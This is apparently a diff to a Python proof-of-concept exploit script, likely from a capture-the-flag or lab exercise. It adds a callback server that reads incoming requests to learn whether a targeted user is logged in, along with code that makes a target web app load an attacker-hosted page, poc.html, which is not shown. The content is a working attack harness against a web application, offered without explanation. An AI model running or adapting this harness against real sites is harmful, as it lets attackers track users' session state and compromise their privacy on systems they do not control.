@@ -3,6 +3,7 @@ import threading
 import logging
 import re
 import requests
+import os
 
 TARGET_URL = 'http://0.0.0.0:8000'
 PORT = 8888
@@ -15,6 +16,16 @@ class S(SimpleHTTPRequestHandler):
         self.end_headers()
 
     def log_message(self, format, *args):
+        for arg in args:
+            log = re.findall(r'GET /(.*) HTTP/1.1',arg)
+            if len(log)>0:
+                if log[0] == '?not_logged_in':
+                    print('User is not logged in')
+                elif log[0] == '?logged_in':
+                    print('User is logged in')
+
+                if log[0] == "?exit":
+                    os._exit(0)
         return
 
 def start_server():
@@ -33,9 +44,13 @@ def start_server():
     logging.info('Stopping httpd...\n')
 
 def send_exploit():
+    print('Targetting user: ')
+    res = requests.get(f"{TARGET_URL}/not_logged_in?url=http://{SERVER_IP}:{PORT}/poc.html")
+    print(res.text)
+    print('Targetting user: ')
     res = requests.get(f"{TARGET_URL}/logged_in?url=http://{SERVER_IP}:{PORT}/poc.html")
     print(res.text)
-    res = requests.get(f"{TARGET_URL}/logged_in?url=http://{SERVER_IP}:{PORT}/poc.html")
+    res = requests.get(f"http://{SERVER_IP}:{PORT}/?exit")
     print(res.text)
 
 def main():
